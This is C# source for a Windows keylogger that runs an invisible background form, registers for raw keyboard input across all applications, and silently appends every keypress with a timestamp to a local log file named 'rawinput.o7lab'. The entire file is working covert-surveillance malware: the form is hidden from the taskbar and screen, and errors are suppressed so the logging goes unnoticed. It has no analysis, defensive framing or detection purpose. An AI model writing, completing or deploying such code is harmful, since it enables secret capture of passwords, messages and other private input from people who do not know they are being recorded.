using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading;

public static class Keylogger
{
    private class HiddenKeylogForm : Form
    {
        private const int RIDEV_INPUTSINK = 0x00000100;
        private const int RID_INPUT = 0x10000003;
        private const int RIM_TYPEKEYBOARD = 1;
        private const int WM_INPUT = 0x00FF;
        private const int WM_KEYDOWN = 0x0100;

        private string logPath = "rawinput.o7lab";

        [StructLayout(LayoutKind.Sequential)]
        struct RAWINPUTDEVICE
        {
            public ushort usUsagePage;
            public ushort usUsage;
            public uint dwFlags;
            public IntPtr hwndTarget;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct RAWINPUTHEADER
        {
            public uint dwType;
            public uint dwSize;
            public IntPtr hDevice;
            public IntPtr wParam;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct RAWKEYBOARD
        {
            public ushort MakeCode;
            public ushort Flags;
            public ushort Reserved;
            public ushort VKey;
            public uint Message;
            public uint ExtraInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct RAWINPUT
        {
            public RAWINPUTHEADER header;
            public RAWKEYBOARD keyboard;
        }

        [DllImport("user32.dll")]
        static extern bool RegisterRawInputDevices(RAWINPUTDEVICE[] pRawInputDevices, uint uiNumDevices, uint cbSize);

        [DllImport("user32.dll")]
        static extern uint GetRawInputData(IntPtr hRawInput, uint uiCommand, IntPtr pData, ref uint pcbSize, uint cbSizeHeader);

        protected override void OnHandleCreated(EventArgs e)
        {
            base.OnHandleCreated(e);

            RAWINPUTDEVICE[] rid = new RAWINPUTDEVICE[1];
            rid[0].usUsagePage = 0x01;
            rid[0].usUsage = 0x06; // Keyboard
            rid[0].dwFlags = RIDEV_INPUTSINK;
            rid[0].hwndTarget = this.Handle;

            RegisterRawInputDevices(rid, (uint)rid.Length, (uint)Marshal.SizeOf(typeof(RAWINPUTDEVICE)));
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WM_INPUT)
            {
                uint dwSize = 0;
                GetRawInputData(m.LParam, RID_INPUT, IntPtr.Zero, ref dwSize, (uint)Marshal.SizeOf(typeof(RAWINPUTHEADER)));

                IntPtr buffer = Marshal.AllocHGlobal((int)dwSize);
                if (GetRawInputData(m.LParam, RID_INPUT, buffer, ref dwSize, (uint)Marshal.SizeOf(typeof(RAWINPUTHEADER))) == dwSize)
                {
                    RAWINPUT raw = (RAWINPUT)Marshal.PtrToStructure(buffer, typeof(RAWINPUT));
                    if (raw.header.dwType == RIM_TYPEKEYBOARD && raw.keyboard.Message == WM_KEYDOWN)
                    {
                        string key = ((Keys)raw.keyboard.VKey).ToString();
                        string logLine = $"{DateTime.Now:yyyy-MM-dd HH:mm:ss} | {key}";
                        try
                        {
                            File.AppendAllText(logPath, logLine + Environment.NewLine);
                        }
                        catch { /* fail silently */ }
                    }
                }
                Marshal.FreeHGlobal(buffer);
            }

            base.WndProc(ref m);
        }
    }

    public static void keylog()
    {
        new Thread(() =>
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            HiddenKeylogForm f = new HiddenKeylogForm();
            f.ShowInTaskbar = false;
            f.WindowState = FormWindowState.Minimized;
            f.Visible = false;

            Application.Run(f);
        })
        {
            IsBackground = true
        }.Start();
    }
}
